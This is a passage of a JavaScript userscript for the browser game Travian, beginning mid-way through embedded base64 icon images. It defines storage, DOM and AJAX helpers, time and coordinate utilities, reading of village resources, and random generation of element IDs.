rBhIrsMgQIA90BGommn7YYiih8AgAhDf0iYQYVumRgdhik2oKMolZgBQAcW/AjYgTXaeKN+H9i1ooNGtACAWTlxN6OQU+5XgVgIbLiMNUS0EB9ONI13X5QJ3njCmHohEMADuqDpyFISGSeBBc0JSeQJG3zF2EAe8KHnERA0wFJNM1WQAQclpmbCBxtU8JVejHEmxqJarDDAhAbVVN9Mny3WKGN2evDpFUhsgABSptZaXwW4ziQBBKt2OgEJr8LKwkVmGWScrbdWoOuuvB7qALButGjGGRjwWaqtuCqrLK/c3oWAb9AqCuoRLazgQUxtFuCEbLa5ztQtRgRgAKwY0jbDAgsl0LMUsskqy+xXBfg2Qrgq1IvFvYBggF0BYkWaa6MIBBzAAhgMHO694wqLBhMYTLBARhx5lMACE3hgMcEGN/LDxkzM6/LLUixRcMoqD8HyEjjnLPO9AGYRBAA7";
var img_info = "data:image/gif;base64,R0lGODlhDAAKAIABAH9/f////yH5BAEAAAEALAAAAAAMAAoAAAIVjA1wi82eFJP0RIhD1Xn77mhKIhoFADs=";
var img_tinfo = "data:image/gif;base64,R0lGODlhDAAMAMIEAACAgICAgICA/4D//////////////////yH5BAEKAAcALAAAAAAMAAwAAAMkeBohwio2R4OkhNQzqX9dplVf9pUjiaWgZ26TOALXR0fcBCkJADs=";
var img_hide = "data:image/gif;base64,R0lGODlhDAAYAIABAExMTP///yH5BAEKAAEALAAAAAAMABgAAAIrjI8Hy20NQXIpxCmXlY/rXX1VNypcKZbqGlEtE55jGtfgDWr0FdOIvwoUAAA7";
var img_cp = "data:image/gif;base64,R0lGODlhCwAOAIABAAAAAP///yH5BAEKAAEALAAAAAALAA4AAAIbjA2nB7nsXmhxpSYdtuzFioTeZFEeBU5mlgYFADs=";
var img_clipIn = "data:image/gif;base64,R0lGODlhEAAMAKECAGZmZrq6AP///////yH5BAEKAAIALAAAAAAQAAwAAAIblI+pFrHZontS0tqWBMDCyHkfdpFl9CBZyh4FADs=";
var img_clipOut = "data:image/gif;base64,R0lGODlhEAAMAKECAGZmZrq6AP///////yH5BAEKAAIALAAAAAAQAAwAAAIelH+By6Hc3INGypasW1tP7lHVJRrAVgrAWK4Z5aYFADs=";
var img_up = "data:image/gif;base64,R0lGODlhDAAMAIABAHm94P///yH5BAEKAAEALAAAAAAMAAwAAAIXjA1we8mb3AtRvSohZjjq3nQeJTrlKRYAOw==";
var img_down = "data:image/gif;base64,R0lGODlhDAAMAIABAHm94P///yH5BAEKAAEALAAAAAAMAAwAAAIXhI+pF8vtQJhu0mUvyvrxzXWhZYyklBUAOw==";
var img_updown = "data:image/gif;base64,R0lGODlhDAAMAIABAHm94P///yH5BAEKAAEALAAAAAAMAAwAAAIajGGXB6jZ4gux0jUvdjlzuHxKJT1kCDUbahQAOw==";
var img_bmove = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAE8AAAAgCAMAAABkSNU7AAAAAXNSR0IArs4c6QAAAGNQTFRFaAAAAAAAAABVVQAAVQBVqgAAAFUAAFVVVVUAVVVVVVWqqlUAqlVVqlWq/1UA/1VVVaoAVapVVaqqqqoAqqpVqqqq/6oA/6pV/6qqVf8Aqv8Aqv9Vqv+qqv////9V//+q////3pvvvAAAAAF0Uk5TAEDm2GYAAANUSURBVEjHrZaLktMwDEXXmAYJGxpTqQm7aez//0qu5LTZB+xrUGfSSeoeXz2du7s3rD21u0+btn+bfgzV3mefgKmqcNmMWXD/IeQOEia3IiJXoJTBnxr4Hcgby/+UUqBWF5hKTofZfinS7MEixahSX0NuLFt5Ok3rNE0UZMmHzdL2rUsV8X0MetX5d9qlOAsG3JpCpMWkucFtiVkEcvHYeBWXQlfXX9YG3DydVxMGO08Sw6/AbXP4YCDuzsIDBwK5lFq46LMastsKGmRtOJcXiIL2gLmROA6BuAELNlQe5IlEp1siHSQbkCJc4ag3nJBrxVamUA2omQW8wKQ70BPH83rexcESqeU50lN5iu3W1fJvAVDsyNBC1CVeYyfcJKV1lZ2IIrOS4Ehll1dVVjcQouik8yysWsAl2WLozrYqhVPaFaYYKbMLpF2e9uTDmLgdZ51VhLksuLjL3VsEA2GSdK2WSc7E8ARMQ+7RE+8O7JMzATc7ULEWPDhuAjtPBXuc3EtPy4kMRrYKkarX6HGiq3E+ttSOLc9Zg23BxSPoPCxHxjQQpJGVIWoZ2uzDg/N6ch/M1UCyorhzmzOICUQeRxpc35UnBE4LQSVNkiNHEwY12HgYCnikXm3ASWBLiswtzU6bo4wP97/HzlPPhw5WuhyahiDTGeGwYgkBX0PQiiYwn0cDpS+czIu5HZqCly6HPIwPD1s+XCB+jvZf431pGtMJhWU4e2a90HNSwJsIPJlUZkltTqizljLd34+3AuxAxIpOYvpaNV0AAWcFmGSTt2ACJvghlARuZtb5Z5t+tpw57PW8DQMMvPN0zpq/o5VDrTee5Zd6141jGUeMaKUhzscWy3S8cDIePR4JfeCUYRhRxycBCvI2ntULqqt3//AVlVHtDBhJv+WoOSE71kLPTim/XZBKCj+yTqhBMDuv/EI/LZclJUHpqo09dF2xBbxgHGK/sryYgNvgRhiLhQ7mzkpFJ2Ci4tKnKgaquw6ozTjM6CJ/H/rb0ypWw94+5nRmI+V8Ax5ssPbh93jet9eOI2tun0jwz9R6dDKokHa5ACTPzqP29tlbtXQql6HYgbmdwv24fHxeto+8G9jIlP0EfnGet//4uvGxlyN9laT/6y3rLdAf9yuedFIpoQQAAAAASUVORK5CYII="

var img_bigIcon = [ // 0-RP, 1-barrack, 2-stable, 3-workshop, 4-market, 5-market_in, 6-ally, 7-ally_attack
	"data:image/gif;base64,R0lGODlhIAAgAKU3ADMzMzNEREREREREVURVRERVVVVVVVVmVVVmZmZmVVVmiGZmZmZmd1V3iGZ3ZlV3mWZ3d2Z3iHd3ZmZ3mXd3d2aIiGaImXeId2aIqmaIu4iId3eIqoiIiGaZu2aZzIiZiHeZu3eZzJmZiIiZu5mZmXeqzIiqu5mqmYiqzIiq3aqqmaqqqqq7qpm73bu7qru7u7vMu8zMu8zMzMzdzN3dzN3d3e7u3f///////////////////////////////////yH5BAEKAD8ALAAAAAAgACAAAAb+wJ9wSCwaj8ikcnk0HBKLRcJApUITU+bPoCGtXi+ZjFarqVRl8cu1ElEOBqTBjC7ba6fT3X6uxZt4enuDd3l+SAl2JCQfHBRRTgsQFBxeK2kJSAsyZVQIDBEYIKMZGBYTEREGnDKZRAAAP5s1JBQyLyccBgglvSUhIR4dm7euQgAUFAIBJzKbMDAzKwggKSi+wBnEK38/AAYcF7UBCyS3MtMjKevXvSEYC2EcrwxUCxwcm2EsCCYtLezavaMQhsIrBAsGCDCQYIUMGDIMjPgH0JrACBxcRCwCoAAEBAIcnMsHAcU6dtggcGDxotsrKi9ixHixoMaKBRVQ6MQWAgHiCRckXBIRwOGcAxUwypBAsIGnthMvDMo5t4IgGFYXFmQA5mECBRIt5ZgLc6Doras1aELo4AGBBhUnhA7RF+MmhwN6zsYoM61B2RUXkiSAEUOGrhUkoryoMTNMGREHNHBTsmkGFYIkDiCwNQMMxBoyHsktIiGsgS+6FBggMUMvDRs0DyipImQTC10PFCC4dOuzTdlJuoGTcdvAgwcG4tGAEZNTjQVatpgrboDSPTWfXwBncvrWohWIqZCgIaPw8+hbwlydvGUBCzEyMqPvHl9olQNw0EvXpV+LAQL9BSjggEMEAQA7",
	"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAgCAMAAABAUVr7AAAAAXNSR0IArs4c6QAAAKVQTFRFAAAZAAAAACQAJCQAJCQkSSQAbSQAAEkAkiQAtiQASUkASUkkSUlJbUkAbUkkAG0kbUlJkkkAkkkkJG0kkklJtkkkbW0ASW1tbW1JAJIkkm0AbW1tkm0kbW2Stm0Akm1ttm0kbZKStpIAkpJtkpKSkpK225IAtpKSkra227YAtraStra2/7YA27a2/9sAttvb29u229vb/9u2/9vb2//////b////7pfdBQAAAAF0Uk5TAEDm2GYAAAIzSURBVDjLZZNde6IwEIVlk2rVsWB3+ShTG0uHBU1HzQby/3/aBoEq7bmAC95ncs6ZMJvd5J5Op1OxSp42SfE2j+N4uZzr2VT0muRPGe5Awuvbc8fE35GZwrPzakwJSdEhjz+m0BXoVIo87xAzJTTUWpelNh6pdzJ/jpfzG+I0GQ1NN+NcU2maktKVR/64kTBaRUIgZhmSbtyZ6jot5TxeZjfE0Vqs1xBFKyGk96wR3kHEj3RndK0ls2mtOVYQyF1zhjQV86W+s2IMErvWkHGcAYCuUxQPD5NApNhZ61i5lkGDrAnQaHdHGGqttW1r2doKXSNlnX6rTTNlxmm2nlS40zKAlCaEAURVcSbZIxHBuwDN6Ca9VsY5ay4XTzCYZoeMyNeT3DDDeKu9F2txhxovpMDSDUHuiSt1gbomdMZWfOcXxu+suscHAXPbOnXXCvJAZEdrL9YeyY+wRJM8FTMfVXS0rVF+Dd4S4LQWlBABKN+K30B7HSi/XbesOlbdYYZUT1gFYynDG9iy1hVhZXuCBXwtb0SMtsawHcL/U0E2ItHgRbcKSVVf4T++ppjNsABytnfTE5wF0vUmaDum9pegbYd6P5hVEERZRNo4KcbUVHHbb4nJd5Rt9vuNWIS/IcAhGASRL8T5G6XWSkWQF1sRhC9eCxwIEQQiyvxPkhd/i7dVXmySIAw7Jlz0xwixXR0ORXH47HTYFpsi+XUlXsLwmicRqzw/9fr8PCX7fXIS4WJA/gPtHWmRX35AtgAAAABJRU5ErkJggg==",
	"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB8AAAAgCAMAAADdXFNzAAAAAXNSR0IArs4c6QAAAHVQTFRFAAARJAAAJCQAJCQkSSQAbSQASUkkSUlJbUkAbUkkbUlJkkkAkkkkbW0kbW1JbW1tkm0kkm1Jtm0Akm1ttm0k220A220kkpIkkpJJtpIkkpKStpJJ25IktpKStrZJtraS27ZJtra2/7ZJ27a2/9tt29vb////oYW9HgAAAAF0Uk5TAEDm2GYAAAGNSURBVCjPlZLbkpwgEIYdQGhkHEgvamCJKybw/o+Y1j3EbEiq0jdafFL/we66/51c/omLg+F4/PU6GkZYtVj9lomj6KIWDdp1P5YnCyCsQfYnj7Urq1scv5nJNHhdt33fguYSgbGWta9u1BKkQCZa/urLlxB0b8jh0MpXa41gcCJu2+Ft9vj8fTFM5mZ3Uc2+5Ghursmj0vNz4RZuS2zxARKGWgpjY4tblxJiLvEG+jOvVnLtyTqNAAifeB188pwd2SZgvXa/8TzolAgxdmAOBuS1gMIhzWgAzQ0QuBBo7o8rZ558+QDYs54JAYhuvHLtT19UPDeyDD3xrV7kT36IGwGRWiC+5+v9hNOhjUay0ll6kUHVSziy9zqWjiNxNrpfCep9euNGqEeXgeTG3fH3L6rG0+CEPUQeiw4T3rfNyfeSLLiDQw/KZm51mCcI++a44q8GH2qeEEDboujviEBtLfu+jpx/RADtacFpBbosPcm5ddnXD3608PRWti3prFtvIcjGlnOVzrxGy1X9BJSoIlZs9JBGAAAAAElFTkSuQmCC",
	"data:image/gif;base64,R0lGODlhIAAgAKUvAAAAAEkAACQkACQkJEkkAEkkJG0kALYkAElJAElJJElJSW1JAElJbW1JJG1JSZJJALZJAG1tAEltbW1tSZJtAG1tbZJtJG1tkpJtSbZtANttAJKSAG2SkpKSSbaSAJKSbbaSJJKSkpKSttuSAJK2ttu2ALa2tra229u2ttvbAP/bALbb29vb29vb/9v//////////////////////////////////////////////////////////////////////yH5BAEAAD8ALAAAAAAgACAAAAb+wJ9wSCwOFQqWkFWRvIzQqLASklqvrOp1W3y9Ktzw0BF6irevhvYcfbI2FSW7u/xNVGXzvP4DI1QmQmtzCk8hAx8RDT8fG4F7VD8mAiwCKS8OHoNsYCGOJioDChRyeyYsCiksLykLChGlcywdKRE/LCoIJpp7Py8TESoRKA0jLKAIvSwRJSkCDxkafbm9JggaGwQGGhoGEQ+bYi8FECMB2xoEIwl6bAoHBhkBB/DcAI9sLwb73fQBGgcAADAVIIAAgAAOzFM4kM2hghD3nTMQoOEZCSYACIDIsSKAWFwUrHAhQuDGggIEDgBzRkGFFidOkAghgUEFEReQhLsyIIFjgwYkgsY8wYGBKJBSWHxAYGHBgAUMgko1qkBAmBdPLSAgUEBACKkzB4gdwKWABa0fD5mQSUIEBwUMKHFhikABPgwhKjCQoEAs0igVQCAQ0M7BBEkhQphoZ4WABQL4hrBIsCcIADs=",
	"data:image/gif;base64,R0lGODlhIAAgAMIEAAAAADMzM0xMTOXjI////////////////yH5BAEKAAQALAAAAgAgAB4AAAN9SLrc/jDKSau9VghsAdDaInwcM3ofSJbKtqAeWG6uCYP1RDuje+cQFzDm8OhEDWID+KgNV6YjYdB69ZYEZnTAzVqhVe0LZhSBnRLy8jz1TgBN6IZLFevkdK5dclWQyxx9fjAsWWB+hS2HiWZ7GAGQAQCRAYx/aoyZmpucHAkAOw==",
	"data:image/gif;base64,R0lGODlhIAAgAIQcAKocAMYcAOMcAKo5HKo5OcY5HFVVVeM5HP85AI5VOXFxcf9VHKpxVcZxVY6Ocf9xVY6Ojv+Ocaqqjqqqqsaqqv+qjsbGxuPGxv/GxuPj4//j4///4////////////////yH5BAEAAB8ALAAAAAAgACAAAAW84CeOZGmeaKqubOu+8BdFMas9T71Gy1PpqceiBzxVEMgFplhaIJE5pmghqFqjI4jW8BIErFUE6QIoA1wZ5DeM4IzIZpclkfAGEAlG5m0+tzIQDgGDAlp7InAAAWgWEoNfExaHHxRmiy8UAWWXJJmbMJWfIxmNjwKRkyqJnB+AgoSGLYl+InN1g3h6sn0kaQhrAkhuLLMlXmDBL1oQXCRUyFhMTk/RTEdJS1IjQkTaIzw+3iM31d4z4ujp3iEAOw==",
	"data:image/gif;base64,R0lGODlhIAAgAIQeAFUrK4ArAIArK6orK1VVVYBVK4BVVapVK6pVVdRVK6qAVaqAgKqAqtSAVdSAgP+AVaqqqtSqVdSqgNSqqv+qVdSq1P+qgP+qqtTUqtTU1P/Uqv/U1P/U/9T//////////yH5BAEKAB8ALAAAAAAgACAAAAX+4CeOZGmeaKqubOu+cCzPdK0KiKAi0ysoDosDYQIYGBlPZsFcmA4IiURD3WgujYMIkulWPOCksmIQFRqWtNpyoWosjYbYM+GEwWBEgyJpPB4UcXtrFhQUE3hdSnMTaW5vhYZxFJGSHh1giBMbeBIWV4SGlA97ooaIYRwQHJgbnpWmhlSBsRKJXJd0sbuUVHAJlHxiHBMQnbymgxpWk5QYuV0dHa7Ihml+jhpxabZ4uROlyJ9wg4WAgUkcHBsbGUHVpGmShg8H9gcGSx9GBGeAsIUKNQt0QAcLPX6CUTi3cFKDAC4EHCAXLs65OAZfDJjYIEFFQRljKNBD6lwELTYQPggQVKBAypcwY8qcSRNmCAA7",
	"data:image/gif;base64,R0lGODlhIAAgAOMOACQkJElJSW1tbZJtbZKSbZKSkraSkra2kra2ttu2ttvbttvb2//b2///2////////yH5BAEKAA8ALAAAAAAgACAAAAT+8MlJaVs16y2X+xgnZp8jCM6oPp6DAALjhGuGeEggLEuBzLXJDXf69Xye4K3h0v0QBxeiUGDQRIhbQeCTgo5dhEqxmGZvQ1eZOlyVFwf2OaH4+ZAKFXpK7R3QPFRIYiMKZHFZCj5ndYJlbmR3WX9TgVQHjyNDfIF7DHwECAkHKgsKDqcJQ45HBjyEWDxglj5WpgYFdWOnUAUeirWfBQSLBaWvUg1Lq7gBPnoeszO4CFbECzvGIzwOcX1TuAsMAlkLA1Oa0X0LDQfE1dhl5LAcZDMuvmXUDHdbPekf5OAr4GpBAGcntImwdyufoGpTnCncFlCQMl8XuJBS0sJbCwcpW+gpAVHtA4J5QSpgKuGgAZuUGn6YFKALZoaVBRJcsVlBpkieFfIEiQAAOw=="
	];

/*********************** common library ****************************/

var useDOMs = typeof window.localStorage == 'undefined' ? false: true;
var khtmlFL = /khtml/i.test(navigator.appVersion);
if ( ! (typeof GM_getValue == 'undefined' || khtmlFL) ) {
	if( useDOMs )
	if( GM_getValue('brokenFF',0) == 1 ) useDOMs = false;
	else {
		GM_setValue('brokenFF',1);
		if( typeof window.localStorage.setItem != "undefined" ) GM_setValue('brokenFF',2);
	}
}
if (typeof GM_addStyle == 'undefined' ) {
  function GM_addStyle(css) {
    var head = document.getElementsByTagName('head')[0];
    if (head) {
      var style = document.createElement("style");
      style.type = "text/css";
      style.appendChild($t(css));
      head.appendChild(style);
    }
  }
}
function RB_getValue ( key, defaultValue ) {
	if( useDOMs ) {
		var value = window.localStorage.getItem(key);
		if( value == null ) value = defaultValue;
		return value;
	} else return GM_getValue( key, defaultValue );
}
function RB_setValue( key, value ) {
	if( useDOMs )
		window.localStorage.setItem( key, value );
	else
		GM_setValue( key, value );
}
function RB_deleteValue( key ) {
	if( useDOMs )
		window.localStorage.removeItem( key );
	else
		GM_deleteValue( key );
}
function $xf(xpath, xpt, startnode, aDoc) {
	var XPFirst = XPathResult.FIRST_ORDERED_NODE_TYPE;
	var XPList = XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE;
	var XPIterate = XPathResult.UNORDERED_NODE_ITERATOR_TYPE;
	var XPResult = XPathResult.ORDERED_NODE_SNAPSHOT_TYPE;
	if (!aDoc) aDoc = document;
	if (!startnode) startnode = document;
	var xpres = XPFirst;
	switch (xpt) {
		case 'i': xpres = XPIterator; break;
		case 'l': xpres = XPList; break;
		case 'r': xpres = XPResult; break;
	};
	var ret = aDoc.evaluate(xpath, startnode, null, xpres, null);
	return (xpres == XPFirst ? ret.singleNodeValue : ret);
};
function ajaxRequest(url, aMethod, param, onSuccess, onFailure) {
	var aR = new XMLHttpRequest();
	aR.onreadystatechange = function() {
		if( aR.readyState == 4 && (aR.status == 200 || aR.status == 304))
			onSuccess(aR);
		else if (aR.readyState == 4 && aR.status != 200) onFailure(aR);
	};
	aR.open(aMethod, url, true);
	if (aMethod == 'POST') aR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=utf-8');
	aR.send(param);
};
Number.prototype.NaN0 = function(){return isNaN(this)?0:this;};
String.prototype.trim = function(){return this.replace(/&nbsp;/g,'').replace(/^\s+|\s+$/g,'');};
String.prototype.onlyText = function(){return this.replace(/([\u2000-\u20ff])/g,'').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/<[\s\S]+?>/g,'');};
String.prototype.firstText = function(){return this.replace(/&lt;/,'<').split('<')[0].trim();};
function $g(aID) {return (aID != '' ? document.getElementById(aID) : null);};
function $gn(aID) {return (aID != '' ? document.getElementsByName(aID) : null);};
function $gt(str,m) { return (typeof m == 'undefined' ? document:m).getElementsByTagName(str); };
function $gc(str,m) { return (typeof m == 'undefined' ? document:m).getElementsByClassName(str); };
function $at(aElem, att) {if (att !== undefined) {for (var xi = 0; xi < att.length; xi++) {aElem.setAttribute(att[xi][0], att[xi][1]); if (att[xi][0].toUpperCase() == 'TITLE') aElem.setAttribute('alt', att[xi][1]);};};};//Acr111-addAttributes
function $t(iHTML) {return document.createTextNode(iHTML);};
function $e(nElem, att) {var Elem = document.createElement(nElem); $at(Elem, att); return Elem;};
function $ee(nElem, oElem, att) {var Elem = $e(nElem, att); if (oElem !== undefined) if( typeof(oElem) == 'object' ) Elem.appendChild(oElem); else Elem.innerHTML = oElem; return Elem;};
function $c(iHTML, att) { return $ee('TD',iHTML,att); }
function $a(iHTML, att) { return $ee('A',iHTML,att); }
function $am(Elem, mElem) { if (mElem !== undefined) for(var i = 0; i < mElem.length; i++) { if( typeof(mElem[i]) == 'object' ) Elem.appendChild(mElem[i]); else Elem.appendChild($t(mElem[i])); } return Elem;};
function $em(nElem, mElem, att) {var Elem = $e(nElem, att); return $am(Elem, mElem);};
function offsetPosition ( el ) {var oL=0,oT=0; do {oL+=el.offsetLeft;oT+=el.offsetTop;} while(el=el.offsetParent ); return [oL,oT];}
function toNumber(aValue) {return parseInt(aValue.replace(/\W/g, "").replace(/\s/g, ""));};
function insertAfter(node, rN) {rN.parentNode.insertBefore(node, rN.nextSibling);};
function ajaxNDIV(aR) {var ad = $ee('div',aR.responseText,[['style','display:none;']]); return ad;};
function $ib(node, rN) {rN.parentNode.insertBefore(node, rN);};
function dummy() {return;};
jsVoid = 'javaScript:void(0)';
jsNone = 'return false;';
function esc(str) { return str.toString().replace(/@/g, "%40"); }
function unesc(str) { return str.replace(/%40/g, "@"); }
function newOption (node,text,value) { node.appendChild($ee('OPTION',text,[['value',value]])); }

function formatTime(secc, aFormat){
	//aFormat: 0 = h:mm:ss (h = 0->... can be more than 24); 1 = days, h:mm:ss; 2 = h:mm:ss (h = 0->23:59:59 = only time); 3 = h:mm (h = 0->... can be more than 24); 4 = days h:mm; 5 = h:mm
	if( isNaN(secc) || secc === Infinity ) return '--:--';
	var ht = secc < 0 ? "-" : "";
	var sec = Math.abs(secc);
	var h = Math.floor(sec/3600);
	var m = Math.floor(sec/60) % 60;
	var s = parseInt(sec % 60);
	switch (aFormat) {
		case 4:
		case 1: var d = Math.floor(h/24); h = h - d * 24; if( d > 0 ) ht += d + " "; break;
		case 2:
		case 5: h = h % 24; break;
	}
	ht += h + ":" + (m > 9 ? m: '0' + m);
	if( aFormat < 3 ) ht += ":" + (s > 9 ? s : '0' + s);
	h = null; m = null; s = null; d = null;
	return ht;
}

function toSeconds(hTime) {
	var p = hTime.match(/(\d+):(\d+):(\d+)/);
	return p ? (p[1] >= 0 ? 1:-1) * ( (Math.abs(p[1]) * 3600) + (p[2] * 60) + (p[3] * 1)): 0;
}

function httpGet(url) {
	var xhttp = new XMLHttpRequest();
	xhttp.open("GET", url, false);
	xhttp.send(null);
	return xhttp.responseText;
}

function getRandom ( x, y ) {
	return x+Math.round(Math.random()*y);
}

/********************* travian library *****************************/

function id2xy(vid) {
	var arrXY = new Array;
	var ivid = parseInt(vid);
	arrXY[0] = ((ivid-1) % 801) - 400;
	arrXY[1] = 400 - Math.floor((ivid-1) / 801);
	return arrXY;
}

function xy2id(x, y) {
	return (1 + (parseInt(x) + 400) + (801 * Math.abs(parseInt(y) - 400)));
}

function getVid ( hr ) {
	var vIdH = hr.match(/[&\?][zd]=(\d+)/);
	if( vIdH ) vId = vIdH[1];
	else {
		vIdH = hr.match(/[&\?]x=(-?\d+)&y=(-?\d+)/);
		vId = vIdH ? xy2id(vIdH[1], vIdH[2]) : 0;
	}
	return vId;
}

function getVidFromCoords ( txt ) {
	var xy = new Array;
	if( /coordinateX/.test(txt) ) {
		txt = txt.replace(/([\u2000-\u20ff])/g,'');
		xy[1] = txt.match(/coordinateX.+?(-?\d{1,3})/)[1];
		xy[2] = txt.match(/coordinateY.+?(-?\d{1,3})/)[1];
	} else
		xy = txt.match(/\((-?\d{1,3})\D+?(-?\d{1,3})\)/);
	return xy ? xy2id(xy[1],xy[2]): -1;
}

function printCoords ( vID ) {
	var xy = id2xy( vID );
	return '('+xy[0]+'|'+xy[1]+')';
}

function calcDistance ( id1, id2 ) {
	var myXY = id2xy( id1 );
	var dXY = id2xy( id2 );
	dX = Math.min(Math.abs(dXY[0] - myXY[0]), Math.abs(801 - Math.abs(dXY[0] - myXY[0])));
	dY = Math.min(Math.abs(dXY[1] - myXY[1]), Math.abs(801 - Math.abs(dXY[1] - myXY[1])));
	return Math.sqrt(Math.pow(dX, 2) + Math.pow(dY, 2));
}

function getTTime(dist, speed, arena, artefact, shoes) {
	var artSp = [1,0.33,0.5,0.67,1.5,2,3];
	var shK = shoes ? shoes: 0;
	speed *= artSp[artefact];
	var aradius = ver4FL ? 20 : 30;
	if( ( arena > 0 || shK > 0 ) && dist > aradius ) {
		return Math.round((dist-aradius)/(speed*(1+arena*0.1+shK))*3600+aradius/speed*3600);
	} else {
		return Math.round(dist/speed*3600);
	}
}

function getUserID() {
	if( ver42FL ) {
		try {
			return $gt('img',$g('heroImageButton'))[0].src.match(/uid=(\d+)/)[1];
		} catch(e) { return null; }
	} else {
		var uLink = $xf("//div[@id='" + pageElem[0] + "']//a[contains(@href, 'spieler.php')]");
		return (uLink) ? uLink.href.split("uid=")[1] : null;
	}
};

var initRes = true;
function getResources () {
	if( initRes ) {
		if( ver4FL )
			if( ver42FL ) {
				try { var resources={};
					var fullScr = $xf('//script[contains(text(),"resources.production")]').innerHTML;
					var r1 = fullScr.match(/resources.production\s=[\s\S]+};/);
					//alert(r1[0]);
					//alert( fullScr );
					eval(r1[0]);
				} catch(e) { loadVCookie('vPPH', 'village_PPH'); }
			} else {
				try { var resources={}; eval($xf('//script[contains(text(),"resources.production")]').innerHTML); }
				catch(e) { loadVCookie('vPPH', 'village_PPH'); }
			}
		for( var i = 0; i < 4; i++ ) {
			var wholeRes = ver4FL ? $g("l" + (1+i)) : $g("l" + (4-i));
			if( ! wholeRes ) return false;
			if( ver4FL ) {
				if( typeof resources != 'undefined' )
					income[i] = resources.production['l'+(1+i)];
				else {
					var resT = $g('production');
					if( resT ) {
						income[i] = resT.rows[1+i].cells[2].innerHTML.match(/-?\d+/)[0];
					} else {
						income[i] = RB.village_PPH[i];
					}
				}
			} else {
				income[i] = parseInt(wholeRes.getAttribute('title'));
			}
			incomepersecond[i] = income[i] / 3600;
			if( ver42FL ) {
				iresNow[i] = parseInt(resources.storage['l'+(1+i)]);
				fullRes[i] = resources.maxStorage['l'+(1+i)];
			} else {
				wholeRes = wholeRes.innerHTML.split("/");
				iresNow[i] = parseInt(wholeRes[0]);
				if( resNow[i] < 0 ) resNow[i] = 0;
				fullRes[i] = parseInt(wholeRes[1]);
			}
		}
		resNow = iresNow.slice();
		initRes = false;
		saveVCookie('vPPH', income.concat(resNow).concat(fullRes).concat(Math.round(RunTime[0]/1000)));
	} else {
		var tnow = new Date().getTime();
		for( var i = 0; i < 4; i++ ) {
			resNow[i] = Math.round(((tnow-RunTime[0])/1e3)*incomepersecond[i] + iresNow[i]);
			if( resNow[i] > fullRes[i] ) resNow[i] = fullRes[i];
			if( resNow[i] < 0 ) resNow[i] = 0;
		}
	}
	return true;
}

function getServerTime() {
	if( loadServerTime == 0 ) loadServerTime = toSeconds($g('tp1').innerHTML);
	return loadServerTime + Math.round(((new Date().getTime()) - RunTime[0])/1e3);
}

function getTimeOffset () {
	return (new Date().getHours()) - parseInt($g('tp1').innerHTML.match(/\d+/)[0]);
}

function absTime( time , stime ) {
	var serverTime = stime || getServerTime();
	var tTime =  Math.abs(time) + serverTime;
	if( Math.abs(time) < 86400 ) if( tTime > 86400 ) tTime -= 86400;
	return tTime;
}

function $eT( tO, time, ft, att ) { // tO-type of Object, time - relative time, ft - time format, att - attributes
	var tTime = absTime(time);
	var dstr = tTime > 86400 ? (new Date((Math.abs(time)+getTimeOffset()*3600)*1e3+(new Date().getTime()))).toDateString()+' ':'';
	var att2 = [['title',dstr + formatTime(tTime, 2)]];
	if( att !== undefined ) att2 = att.concat( att2 );
	return $ee(tO, formatTime(time,ft), att2);
}

function showRunTime() {
	var ltime = $g(pageElem[6]);
	if( ! (ltime) ) {
		ltime = $ee('DIV',$e('BR'),[['style','position:absolute; left:'+(ltr?10:document.body.clientWidth-100)+'px;top:'+(xyBody[1]+2)+'px;color:black;background-color:cyan;padding:1px 5px;border-radius: 2em;']]);
		document.body.appendChild(ltime);
	} else if( ! ver4FL )
		ltime.style.margin="0px 20px";
	RunTime[1] = new Date().getTime();
	var fts = " RB:<b>" + (RunTime[1]-RunTime[0]);
//	fts += "</b>/<b>" + (RunTime[1]-RunTime[2]);
//	fts += "</b>/<b>" + (RunTime[3]-RunTime[2]);
	ltime.insertBefore($ee("span",fts + "</b>ms"), $gt('br',ltime)[0]);
}

/************* CSS & ID *****************/

var allIDs = [
	'mbuyf', // 0-mbuyf
	'resoursebar', // 1-resourcebar
	'progressbar', // 2-progressbar (class)
	'rb_tooltip', // 3-rb_tooltip
	'flDIV', // 4-flDIV (class)
	'newDd', // 5-newDd (class)
	'RBSetup', // 6-RBSetup
	'gnTable', // 7-gnTable (class)
	'rbOverview', // 8-rbOverview
	'rbLinks', // 9-rbLinks
	'pbOview', // 10-pbOview(123) (class)
	'rb_sum', // 11-rb_sum
	'rb_sum2', // 12-rb_sum2
	'redLine', // 13-redLine (class)
	'flDIV', // 14-flDIV(num)
	'buttons', // 15- buttons (class)
	'progressbar-completed', // 16-progressbar-completed
	'rbOtime', // 17-rbOtime
	'sf', // 18-sf
	'bordered', // 19-bordered
	'total', // 20-total
	'invisT', // 21-invisT
	'audio', // 22-audio alerts
	'attAlert', // 23-attack alert
	'FreezePaneOff', // 24-FreezePaneOff (class)
	'FreezePaneOn', // 25-FreezePaneOn (class)
	'InnerFreezePane', // 26-InnerFreezePane
	'FreezePane',  // 27-FreezePane
	'alarmClock', // 28-alarmClock
	'existT',	// 29-mark for links (class)
	'res_sum',	// 30-res_sum
	'ww_res_sum',	// 31-ww_res_sum
/* images */
	'hide',	// 32-img_hide (class)
	'car',	// 33- cargo
	'def',	// 34- defender
	'att',	// 35- attack
	'igm',	// 36- igm
	'info',	// 37- user info
	'edit',	// 38- edit
	'del',	// 39- delete
	'clipin',	// 40- clip in
	'clipout',	// 41- clip out
/* no images */
	'TMbuildingtags',	// 42- (class)
	'tm_uplevel',	// 43- (class) - now vacant!
	'marketWW',	// 44- template for merchant-tables (id)
	'mrgn', // 45- padding for image
	'selected', // 46- selected elements
	'tinfo', // 47- img_tinfo
	'vl'	// 48- village list icons
	];

//RunTime[2] = new Date().getTime();
function randomizeIDs () {
	function replacer ( n ) {
		return rtStr[parseInt(n)];
	}
			//    0   1   2   3   4   5   6   7   8   9
	var rtStr = ['d','h','w','l','y','m','t','a','b','i'];
	var UUIDs = '';
	for( var i = 0; i < allIDs.length; i++ ) {
		do {
			var rID_num = (Math.round(Math.random()*Math.pow(10,Math.random()*3+5) + 1e3)).toString();
			var rID = rID_num.replace(/\d/g, replacer);
			var Rej = new RegExp(rID);
		} while( Rej.test(UUIDs) )
		UUIDs += rID + ',';
		allIDs[i] = rID;
	}
}
